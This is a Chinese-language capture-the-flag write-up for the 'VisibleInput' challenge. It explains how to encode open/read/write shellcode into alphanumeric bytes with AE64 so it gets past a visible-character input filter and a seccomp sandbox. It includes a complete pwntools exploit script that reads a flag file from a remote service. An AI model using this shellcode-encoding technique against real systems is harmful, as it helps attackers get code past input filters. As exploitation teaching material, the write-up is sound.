# VisibleInput

## 题目简述

程序允许执行用户输入，但输入字符集受到“可见字符”限制，普通 ORW shellcode 含有大量不可打印字节，无法直接提交。题目提供的寄存器现场适合用 AE64 将任意 amd64 shellcode 编码成字母数字形式，并在运行时自解码。

## 解题过程

服务端存在沙箱，因此最终载荷执行 `open/read/write`，而不是 `execve("/bin/sh")`。AE64 编码器还需要知道一个指向编码载荷的基址寄存器；本题入口处 `rdx` 满足条件，偏移为 0：

```python
from ae64 import AE64
from pwn import asm, context, remote, shellcraft

context.arch = "amd64"
io = remote("host", 10000)

buf = 0x20240000
orw = asm(
    shellcraft.open("./flag")
    + shellcraft.read(3, buf, 0x40)
    + shellcraft.write(1, buf, 0x40)
)

encoded = AE64().encode(orw, "rdx", 0, "fast")
assert all(chr(byte).isalnum() for byte in encoded)

io.send(encoded)
io.interactive()
```

若附件版本允许的集合是完整可打印 ASCII，而非严格字母数字，仍可使用 AE64；若入口处基址寄存器不同，则必须按调试结果更改第二个参数，不能机械照抄 `rdx`。

## 方法总结

AE64 解决的是 shellcode 的字节约束，它生成一段满足字母数字限制的自解码代码。使用时要同时确认三件事：允许字符集合、载荷基址所在寄存器、沙箱允许的系统调用；编码器不会替你绕过 seccomp。
